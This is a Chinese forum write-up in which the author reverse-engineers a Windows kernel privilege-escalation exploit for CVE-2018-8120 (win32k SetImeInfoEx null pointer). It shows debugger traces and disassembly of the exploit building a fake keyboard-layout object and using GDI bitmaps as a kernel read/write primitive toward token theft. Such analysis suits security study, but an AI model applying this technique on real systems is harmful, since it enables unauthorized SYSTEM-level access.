
# [原创]Windows 提权逆向

一个小白对于 Windows 提权以及逆向的学习，文章中说的思路可能有不对的，希望不要介意！！！

## 01 Windows 内核提权思路

内核提权最终都是通过读写来做一些事情，所有内核提权都是获取一个 `system` 值，从而获得最高权限。

### 001 提权一

替换当前进程 `EPROCESS` 结构的 `token` 为 `system` 的 `token`。

### 002 提权二

替换当前进程 `EPROCESS` 结构体 `token` 所指向的数据。

### 003 提权

3 环直接写 `shellcode` 是不行的，因为当前进程 `EPROCESS` 位于内核空间，要进行读写代码必须在 0 环中，如果在 3 环进行读写会出现保护异常。用户层可以通过调用系统服务来访问内核层代码。

## 02 成因

`win32k.sys` 组件中创建窗口站对象 `CreateWindowStationW()` 时，`SetImeInfoEx()` 函数没有对指针进行安全验证；对应指针指向零页内存，然后在它下一次使用之前有代码对该区域进行修改，触发蓝屏。

## 03 利用

需要提权时，申请一块堆大小，并且构造这块内存中的数据，释放后指向 `shellcode` 位置，当提权完成后再恢复这块数据。

## 04 逆向

以 2018-8120 为例进行傻瓜式分析，开始啦。

前提需要进入当前进程所对应的内核空间。

```
1: kd> !process 0 0 test.exe
1: kd> .process /i 87b06c08
1: kd> g
0: kd> .reload /f /user
0: kd> .process
```

![图片描述](upload/attach/201910/798435_C6MPT4AWCBZZ5UN.png)

### 窗口站

窗口站是和当前进程、会话（session）相关联的一个内核对象，它包含剪贴板（clipboard）、原子表、一个或多个桌面（desktop）对象。

用户调用 `CreateWindowStation()` 创建新的窗口站时，最终会调用内核函数 `xxxCreateWindowStation()` 执行窗口站的创建，但是在该函数执行期间，被创建的新窗口站实例的 `spklList` 指针并没有被初始化，指向的是空地址。

1、`HWINSTA hSta = CreateWindowStationW(0, 0, READ_CONTROL, 0);`

`hSta` 句柄为 `58`，对应在内核中窗口站地址是 `87a85d48`。

```
001b:01246909 8bf4            mov     esi,esp   //
001b:0124690b 6a00            push    0         //0
001b:0124690d 6800000200      push    20000h   //READ_CONTROL
001b:01246912 6a00            push    0        //0
001b:01246914 6a00            push    0        //0
001b:01246916 ff1588522c01    call    dword ptr [test!_imp__CreateWindowStationW (012c5288)]
```

![图片描述](upload/attach/201910/798435_ZDAWV64S2C9JHAB.png)

2、对 `CreateBitmap` 的 `getpvscsn0` 下断点，得到下面四个值。

`CreateBitmap()` 创建的句柄是 `gManger = 1205067e`。

```
001b:012469be 8bf4            mov     esi,esp
001b:012469c0 8d85d0fcffff    lea     eax,[ebp-330h]   //002cf450 00000090
001b:012469c6 50              push    eax              //eax=002cf450=buff
001b:012469c7 6a20            push    20h
001b:012469c9 6a01            push    1
001b:012469cb 6a01            push    1
001b:012469cd 6a60            push    60h
001b:012469cf ff1504502c01    call    dword ptr [test!_imp__CreateBitmap (012c5004)]
```

同理可得：`gWorker = 180504e7`、`mpv = fe667038`、`wpv = fdab8368`。

```
//堆栈变化
002c30e4 00000060
002c30e8 00000001
002c30ec 00000001
002c30f0 00000020
```

![图片描述](upload/attach/201910/798435_JSGPZFNDWPE4B7Z.png)

3、自己申请一块空间的地址。

构造 `tagkl`（目标键盘布局）对象的结构体指针 `piiex` 指向的输入法信息对象的缓冲区。

```
001b:01246a66 c78594fcffff00000000 mov dword ptr [ebp-36Ch],0 //002cf414 00000000 ==>P_tagKL pkl = 0
001b:01246a70 8b8594fcffff mov eax,dword ptr [ebp-36Ch] //eax=00000000==>pkl->hkl
001b:01246a76 8b8da0fcffff mov ecx,dword ptr [ebp-360h] //ecx=fdab8368=wpv
001b:01246a7c 894814 mov dword ptr [eax+14h],ecx //[eax+14]==>[0+14]==>pkl->hkl = (HKL__ *)wpv;
001b:01246a7f 8b85acfcffff mov eax,dword ptr [ebp-354h]
001b:01246a85 83e804 sub eax,4 //eax-4=eax=fe667034
001b:01246a88 8b8d94fcffff mov ecx,dword ptr [ebp-36Ch] //002cf414 00000000 ==>ecx=00000000==>pkl
001b:01246a8e 89412c mov dword ptr [ecx+2Ch],eax //eax=fe667034==>0000002c fe667034
001b:01246a91 685c010000 push 15Ch
001b:01246a96 8d8530fbffff lea eax,[ebp-4D0h]
001b:01246a9c 50 push eax
001b:01246a9d e816c7ffff call test!ILT+435(_RtlSecureZeroMemory) (012431b8)
```

自己申请内存地址初始化 `002cf2b0 = 0xccc`。

![图片描述](upload/attach/201910/798435_KYU657TZYZHNBH9.png)

当触发漏洞时，`002cf2b0` 变成自己构造的数值了，具体汇编这里不做过多的介绍了。

![图片描述](upload/attach/201910/798435_F4RMRCW32KQMR47.png)

下图展示触发漏洞以及在申请的内存里面构造了自己需要的数据。

![图片描述](upload/attach/201910/798435_63TYW5ZC2SBJJFG.png)

![图片描述](upload/attach/201910/798435_SBNYHUWTU2KGZXM.png)

验证自己找的 `gManger`、`gWorker` 等值是否正确。

![图片描述](upload/attach/201910/798435_5P7AAZC95QUYCWA.png)

### 001 SetBitmap

#### 01 Bitmap 分析

思路：`SetBitmapBits() --> NtGdiSetBitmapBits() --> GreSetBitmapBits() --> bDoGetSetBitmapBits() --> memcpy()`。

1、`SetBitmapBits()` 代码分析。

`SetBitmapBits((HBITMAP)gManger, sizeof(PVOID), &oaddr);`

```
001b:01246be5 8bf4            mov     esi,esp
001b:01246be7 8d850cfbffff    lea     eax,[ebp-4F4h]   //&oaddr
001b:01246bed 50              push    eax              //eax=002cf28c
001b:01246bee 6a04            push    4                //00000004 ==》sizeof
001b:01246bf0 8b8dc4fcffff    mov     ecx,dword ptr [ebp-33Ch] //1205067e==》gManger
001b:01246bf6 51              push    ecx              //push 1205067e
001b:01246bf7 ff1508502c01    call    dword ptr [test!_imp__SetBitmapBits (012c5008)]
```

`NtGdiSetBitmapBits(int a1, SIZE_T Size, PVOID Address)`

2、下断点 `bp win32k!NtGdiSetBitmapBits` 进行分析。

`v6 = GreSetBitmapBits(a1, Size, Address, &v4);`

```
win32k!NtGdiSetBitmapBits+0x67:
940d3b0b 8d45dc lea eax,[ebp-24h] 8c16abe8 8c16abfc
940d3b0e 50 push eax //push 8c16abfc==>&v4 ==>8c16abfc 00000000 ==>0
940d3b0f ff7510 push dword ptr [ebp+10h] //002cf28c ==> Address ==>002cf28c 83f6e3fc nt!HalDispatchTable+0x4
940d3b12 ff750c push dword ptr [ebp+0Ch] //push 00000004 ==>sizeof
940d3b15 ff7508 push dword ptr [ebp+8] //push 1205067e ==>gManger==>a1
940d3b18 e8dbcf0800 call win32k!GreSetBitmapBits (94160af8)
```

3、下断点 `bp win32k!bDoGetSetBitmapBits` 进行分析。

`v9` 是算出来的计算公式如下：

![图片描述](upload/attach/201910/798435_ZS7HPYSYXK69DMH.png)

![图片描述](upload/attach/201910/798435_3JREK4RCGV8DHRD.png)

代码如下：

```
win32k!GreSetBitmapBits+0x169:
94160c61 53 push ebx
94160c62 8d4d80 lea ecx,[ebp-80h] 8c16ab44 00000000
94160c65 51 push ecx //8c16ab40 8c16ab54 ==>ecx=8c16ab54==>(struct _SURFOBJ *)&v12 ==> _SURFOBJ *a2
94160c66 50 push eax //8c16ab3c fe667018 ==>eax = fe667018 ==》v9=fdf6bd38 +20= FDF6BD58 =wpv ==> _SURFOBJ *a1
/*
*/
94160c67 e8a5000000 call win32k!bDoGetSetBitmapBits (94160d11)
```

`v9` 计算过程：`gManager` 句柄的后 3 位，`wpv + 20` 位置。

![图片描述](upload/attach/201910/798435_52Y5AX27K4W67HP.png)

![图片描述](upload/attach/201910/798435_YZ5TGSMTDFN3XMZ.png)

(1) 由于漏洞中的 `memcpy()` 大小不可控，所以会覆盖一部分 `SURFOBJ` 成员，所以我们需要修复某些在 `SetBitmapBits`/`GetBitmapBits` 时所必须的成员。

利用 `Bitmap` 内核对象中的 `pvScan0` 字段 + 10 的位置，系统 API 的 `GetBitmapBits()` 和 `SetBitmapBits()` 可以读写 `pvScan0` 所指向内存地址的内容。

(2) 因此这个 `v9` 计算公式有两种。

4、拷贝。

```
win32k!bDoGetSetBitmapBits+0x30a:
9416101b c745fc05000000 mov dword ptr [ebp-4],5 8c16ab30 00000005
94161022 53 push ebx ebx=00000004
94161023 ff750c push dword ptr [ebp+0Ch] 8c16ab40 002cf28c ==>002cf28c==>002cf28c 83f6e3fc nt!HalDispatchTable+0x4
94161026 ff7508 push dword ptr [ebp+8] 8c16ab3c fdab8368 ==》fdab8368==》wpv
win32k!bDoGetSetBitmapBits+0x318:
94161029 e87208ffff call win32k!memcpy (941518a0) fdab8368 ==>wpv
```

![图片描述](upload/attach/201910/798435_NZZEPSG5BH76FSN.png)

### 总结

剩下的 `GetBitmapBits()` 以及需要逆向的其他函数都是类似操作，只要知道调用哪个函数就可以动态跟踪里面数据。
